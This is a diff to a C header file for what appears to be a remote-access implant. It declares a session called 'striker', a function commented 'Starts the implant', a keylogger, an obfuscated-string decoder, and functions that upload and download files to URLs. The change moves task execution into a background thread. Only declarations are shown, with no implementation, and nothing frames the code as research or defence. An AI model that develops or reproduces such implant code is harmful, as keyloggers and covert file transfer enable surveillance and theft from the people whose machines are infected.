@@ -36,10 +36,15 @@ typedef struct{
   char *type; // The type of the task
   cJSON *data; // The data needed by the task
   unsigned short completed; // Indicates if the task has been completed.
-  unsigned short queued; // Indicates if the task has been queued.
   cJSON *result; // The result of the task.
   cJSON *input_json; // The cJSON object used to generate the task.
 } task;
+
+// A struct for passing session and task to task executor.
+typedef struct{
+  session *striker;
+  task *tsk;
+} task_wrapper;
 
 // For decoding obfuscated strings.
 char *obfs_decode(char *str);
@@ -69,8 +74,8 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
 // Download a file from `url` and save to `wfo`. Returns 1 on success.
 short int download_file(char *url, FILE *wfo, buffer *result_buff);
 
-// Starts a keylogger for a given duration. Called in a thread.
-void *keymon(void *ptr);
+// Keylogger.
+void keymon(task *tsk);
 
 // Parse a task JSON and return it, NULL on error.
 task *parse_task(cJSON *json);
@@ -78,8 +83,8 @@ task *parse_task(cJSON *json);
 // Free a task.
 void free_task(task *tsk);
 
-// Execute a task.
-void execute_task(session *striker, task *t);
+// Executes a task in a background thread.
+void *task_executor(void *ptr);
 
 // Starts the implant.
 void start_session();
